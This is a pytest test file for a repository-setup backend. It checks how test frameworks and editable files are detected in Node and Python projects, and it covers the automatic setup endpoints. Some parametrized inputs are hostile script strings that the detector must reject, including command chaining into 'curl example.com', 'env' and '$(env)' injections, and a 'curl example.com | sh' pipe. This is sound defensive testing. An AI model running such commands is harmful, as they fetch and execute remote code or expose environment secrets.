import pytest
from fastapi import HTTPException
from fastapi.testclient import TestClient
from backend.repository_detection import detect_configuration
from test_repository_setup import configured, HEADERS, Runner
from test_github_auth import seed


@pytest.mark.parametrize('command,engine', [('vitest','vitest'), ('vitest run','vitest'), ('jest','jest'), ('jest --runInBand','jest'), ('node --test','node')])
def test_common_node_scripts_are_normalized_without_shell_execution(command, engine):
    from backend.node_repository import test_engine
    assert test_engine({'scripts':{'test':command}}) == engine


@pytest.mark.parametrize('command', ['vitest && curl example.com', 'npm run custom', 'jest; env', 'vitest $(env)'])
def test_node_detection_never_executes_arbitrary_scripts(command):
    from backend.node_repository import test_engine
    with pytest.raises(ValueError): test_engine({'scripts':{'test':command}})


def test_pnpm_workspace_finds_nested_test_package_and_frozen_lock():
    from backend.node_repository import node_layout
    paths = ['package.json','pnpm-lock.yaml','pnpm-workspace.yaml','frontend/package.json',
             'frontend/vitest.config.ts','frontend/src/math.test.ts','frontend/src/math.ts','other/src/other.test.ts']
    config = detect_configuration(paths, {'scripts':{'test':'vitest'}}, 'frontend')
    assert node_layout(config.test_files) == ('frontend','pnpm')
    assert config.editable_files == ['frontend/src/math.ts']
    assert 'pnpm-lock.yaml' in config.test_files
    assert 'other/src/other.test.ts' not in config.test_files


def test_npm_detection_freezes_tests_and_excludes_generated_and_hidden_files():
    config = detect_configuration(['package.json', 'package-lock.json', 'tests/math.test.ts',
        'vitest.config.ts', 'src/math.ts', '.env', 'node_modules/other.ts', 'dist/math.js'],
        {'scripts': {'test': 'vitest run'}})
    assert config.editable_files == ['src/math.ts']
    assert set(config.test_files) == {'package.json', 'package-lock.json', 'tests/math.test.ts', 'vitest.config.ts'}


@pytest.mark.parametrize('paths,package', [
    (['src/math.py'], None),
    (['package.json', 'package-lock.json', 'tests/math.test.js', 'src/math.js'], {'scripts': {'test': 'curl example.com | sh'}}),
    (['package.json', 'tests/math.test.js', 'src/math.js'], {'scripts': {'test': 'node --test'}}),
])
def test_ambiguous_or_unsupported_detection_requires_manual_setup(paths, package):
    with pytest.raises(HTTPException) as exc:
        detect_configuration(paths, package)
    assert exc.value.status_code == 422


def test_automatic_setup_requires_csrf_and_validation_before_ready(tmp_path, monkeypatch):
    app = configured(tmp_path, monkeypatch)
    with TestClient(app) as client:
        seed(app, 'github:1', 'session1')
        client.cookies.set('torque_session', 'session1')
        endpoint = '/api/repositories/source/demo/setup/automatic'
        assert client.post(endpoint).status_code == 403
        response = client.post(endpoint, headers=HEADERS)
        assert response.status_code == 202
        assert response.json()['status'] == 'validating'
        request_id = Runner.request_id
        assert client.post(endpoint, headers=HEADERS).json()['status'] == 'validating'
        assert Runner.request_id == request_id
        assert client.get('/api/repositories/source/demo/setup').json()['status'] == 'ready'
        assert client.get('/api/auth/github/repositories').json()['repositories'][0]['run_supported']


def test_large_source_inventory_no_longer_requires_user_file_selection():
    config = detect_configuration(['tests/test_math.py'] + [f'src/file{i}.py' for i in range(40)])
    assert config.test_files == ['tests/test_math.py']
    assert len(config.editable_files) == 10


def test_python_monorepo_freezes_requirements_and_excludes_javascript_tests():
    config = detect_configuration(['backend/requirements.txt', 'backend/tests/test_api.py',
                                  'backend/app/main.py', 'frontend/tests/upload.test.mjs'])
    assert config.test_files == ['backend/requirements.txt', 'backend/tests/test_api.py']
    assert config.editable_files == ['backend/app/main.py']


def test_manual_test_setup_does_not_require_edit_paths(tmp_path, monkeypatch):
    app = configured(tmp_path, monkeypatch)
    with TestClient(app) as client:
        seed(app, 'github:1', 'session1')
        client.cookies.set('torque_session', 'session1')
        response = client.post('/api/repositories/source/demo/setup', headers=HEADERS,
                               json={'framework':'pytest', 'test_files':['tests/test_math.py']})
        assert response.status_code == 202
        assert response.json()['configuration']['editable_files'] == ['src/math.py']


def test_explicit_retry_redetects_failed_setup_without_automatic_retry_loop(tmp_path, monkeypatch):
    import time
    app = configured(tmp_path, monkeypatch)
    with TestClient(app) as client:
        seed(app, 'github:1', 'session1')
        client.cookies.set('torque_session', 'session1')
        endpoint = '/api/repositories/source/demo/setup/automatic'
        assert client.post(endpoint, headers=HEADERS).status_code == 202
        original = Runner.request_id
        monkeypatch.setattr(Runner, 'passed', False)
        assert client.get('/api/repositories/source/demo/setup').json()['status'] == 'failed'
        assert client.post(endpoint, headers=HEADERS).json()['status'] == 'failed'
        assert Runner.request_id == original
        later = time.time() + 70
        monkeypatch.setattr('backend.repository_setup.time.time', lambda: later)
        monkeypatch.setattr(Runner, 'passed', True)
        assert client.post(endpoint+'?retry=true', headers=HEADERS).json()['status'] == 'validating'
        assert Runner.request_id != original
        assert client.get('/api/repositories/source/demo/setup').json()['status'] == 'ready'
